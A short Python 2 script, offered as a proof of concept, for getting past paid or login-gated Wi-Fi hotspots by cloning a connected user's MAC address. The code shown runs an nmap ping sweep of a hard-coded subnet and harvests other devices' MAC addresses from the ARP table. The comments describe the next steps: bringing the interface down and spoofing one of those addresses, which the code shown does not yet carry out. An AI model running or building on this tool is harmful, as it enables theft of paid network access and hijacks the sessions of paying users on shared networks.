# This code will allow one to bypass the required logins or payements in wifi hotspots
# Provided that there are people around that are logged in/paying
# It is by no means fool proof and your mileage may very
# More of a proof of concept
# so yeah



#first thing is to find your ip domain. i.e. 192.168.1.* 


#once we have that we launch an nmap ping of every address withing that subdomain

#while the ping is running we listen into the arp table. The network should give us
#the mac address of the nearby computers when we tell it we are pinging 
#inside the network

#once the arp table has been built or after a minute or so, we read the arp tables and we pick out valid mac addresses that aren't our own

#we bring the interface down, we change the mac address bring it up and verify 
#the adress has changed

#Then we hold on for a bit and ask the user if he is connected or not



import time
import subprocess



#find the mac address and ip domain of interface
def findLocalNetworkInfo():
    iface='eth8'
    sout=subprocess.check_output('ifconfig',shell=True)
    sout=sout.split('\n')

    ifaceIndex = -1
    for i in range(len(sout)):
        if iface in sout[i]:
            ifaceIndex=i
            break
            
    macIndex = sout[ifaceIndex].find('HWaddr')+7  #there are 6 characters in hwaddr and a space before the mac address shows up
    systemMac = sout[ifaceIndex][macIndex:-2] #there is a leading space, get rid of it

    ipDomainIndex = sout[ifaceIndex+1].find('inet addr:')+10 #10 is the no of chars in inetaddr: the +1 is because the ip address is located on the line below HWaddr
    ipDomainEndIndex = sout[ifaceIndex+1].find('Bcast')-2 #2 is because there are 2 spaces before the end of the ip

    ipDomain = sout[ifaceIndex+1][ipDomainIndex:ipDomainEndIndex] #store the ip addr
    ipDomainEndIndex=ipDomain.rfind('.') #find the last period in the the ip addr
    ipDomain = ipDomain[0:ipDomainEndIndex] + '.*' #format the ip domain like 192.168.1.*

    print 'using the interface', iface
    print 'found the ip domain to be ', ipDomain
    print 'found the system mac address to be ', systemMac
    netInfo = {'ipDomain':ipDomain,'systemMac':systemMac}
    return netInfo

def startNmap():
    nmap = subprocess.Popen(['nmap','-sP','10.2.243.*'],stdout=subprocess.PIPE) #start the nmap process
    return nmap

def listenToArp():
    arpTable = subprocess.Popen(['arp','-a'],stdout=subprocess.PIPE) #start the nmap process
    return arpTable

def populateMacAddress():
    nmap = startNmap()
    arpTable = listenToArp()
    i=0
    while arpTable.poll() is None:
        print 'Waiting on the arp table to finish building'
        i+=1
        time.sleep(10)
        if i>5:
            print "my o my it is taking quite a long time!"
            i=0;

    arpCache = arpTable.stdout.read()
    arpCache = arpCache.split('\n')
    validMAClist = []
    for row in arpCache:
        if '<incomplete>' not in row:
            validMAClist.append(row)

    print 'validmac list is ', validMAClist
    print 'arpchace is',arpCache
    for i in range(len(validMAClist)):
        startIndex = validMAClist[i].find('at')+3 # 2 chars and a space
        endIndex = startIndex+17
        validMAClist[i]=validMAClist[i][startIndex:endIndex]
    print 'the macs that are valid are:', validMAClist
    return validMAClist


netInfo=findLocalNetworkInfo()
populateMacAddress()

